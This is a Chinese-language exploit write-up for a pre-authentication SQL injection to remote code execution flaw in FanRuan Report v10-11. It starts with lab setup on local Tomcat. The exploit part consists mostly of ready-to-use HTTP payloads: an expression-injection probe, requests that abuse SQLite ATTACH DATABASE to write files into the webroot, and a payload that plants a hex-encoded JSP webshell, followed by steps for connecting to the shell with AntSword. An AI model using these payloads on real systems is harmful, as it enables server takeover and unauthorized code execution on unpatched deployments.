# 帆软报表v10-11前台SQL漏洞RCE

## 环境搭建

从网上下v10 2024.7.23之前的版本，23号的更新补丁了

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407251921283.png)

安装好后，将`webapps`目录中 `webroot目录` 的复制到 `tomcat` 中的webapps目录中

接着启动运行 tomcat

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407251923118.png)


![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407251923659.png)

### tomcat

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407251924761.png)

接着运行 `apache-tomcat-8.5.87\bin\startup.bat` 就成功搭建环境了

第一次运行 先访问 `http://127.0.0.1:8080/webroot/decision`  要设置密码，默认内置和外置数据库

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407251926809.png)

## 报错解决

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252141517.png)

配置tomcat `server.xml` 添加 `relaxedQueryChars="[]|{}^&#x5c;&#x60;&quot;&lt;&gt;"`

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252143358.png)

## poc

```java
GET /webroot/decision/view/ReportServer?test=&n=${9*9} HTTP/1.1
Host: 127.0.0.1:8080
```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252125236.png)


## 写文件poc

```java
GET /webroot/decision/view/ReportServer?test=&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Fasd1.jsp%27%20as%20asd1%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20asd1.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20asd1.exp2%28data%29%20VALUES%20%28%27123%27%29%3B'),1,1)} HTTP/1.1
Host: 127.0.0.1:8080

```
![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252013758.png)
![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252013019.png)

## 本地测试写马
### payload
```java
/webroot/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('﻿ATTACH DATABASE '../webapps/webroot/aaa.jsp' as gggggg;'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('﻿CREATE TABLE gggggg.exp2(data text);'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('﻿INSERT INTO gggggg.exp2(data) VALUES (x'247b27272e676574436c61737328292e666f724e616d6528706172616d2e61292e6e6577496e7374616e636528292e676574456e67696e6542794e616d6528276a7327292e6576616c28706172616d2e62297d');'),1,1)} 
```
![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252128382.png)
### 成功写入

```java
GET /webroot/decision/view/ReportServer?test=&n=/webroot/decision/view/ReportServer?test=s&n=${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFATTACH%20DATABASE%20%27..%2Fwebapps%2Fwebroot%2Fhelp.jsp%27%20as%20teeeee%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFCREATE%20TABLE%20teeeee.exp2%28data%20text%29%3B'),1,1)}${__fr_locale__=sql('FRDemo',DECODE('%EF%BB%BFINSERT%20INTO%20teeeee.exp2%28data%29%20VALUES%20%28x%27247b27272e676574436c61737328292e666f724e616d6528706172616d2e61292e6e6577496e7374616e636528292e676574456e67696e6542794e616d6528276a7327292e6576616c28706172616d2e62297d%27%29%3B'),1,1)} HTTP/1.1
Host: 127.0.0.1:8080

```

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252149998.png)

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252150063.png)

蚁剑进行连接，添加get参数?a=javax.script.ScriptEngineManager，蚁剑连接密码为b，连接类型选择JSPJS

![image.png](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407252150021.png)

## 参考
- https://y4tacker.github.io/2024/07/23/year/2024/7/%E6%9F%90%E8%BD%AFReport%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%AD%E5%88%A9%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E7%BB%86%E8%8A%82/
- https://mp.weixin.qq.com/s/AliftiLevjz5HB9uL0DOqQ